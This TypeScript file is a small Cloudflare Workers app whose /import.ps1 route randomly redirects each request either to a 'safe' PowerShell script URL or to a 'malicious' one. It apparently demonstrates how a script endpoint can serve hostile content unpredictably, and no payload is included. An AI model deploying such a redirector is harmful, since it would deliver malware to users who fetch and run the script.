import { Hono } from "hono";
import { CfBindings } from "./types";
import { rateLimiter } from "hono-rate-limiter";

const app = new Hono<{ Bindings: CfBindings }>();

app.use(
  rateLimiter<{ Bindings: CfBindings }>({
    binding: (c) => c.env.RATE_LIMITER,
    keyGenerator: (c) => c.req.header("cf-connecting-ip") ?? "",
  }),
);

function flipACoin() {
  return Math.random() < 0.5 ? "Heads" : "Tails";
}

app.get("/import.ps1", (c) => {
  const coinflipResult = flipACoin();

  if (coinflipResult === "Heads") {
    return c.redirect(c.env.SAFE_SCRIPT_URL);
  } else {
    return c.redirect(c.env.MALICIOUS_SCRIPT_URL);
  }
});

export default app;
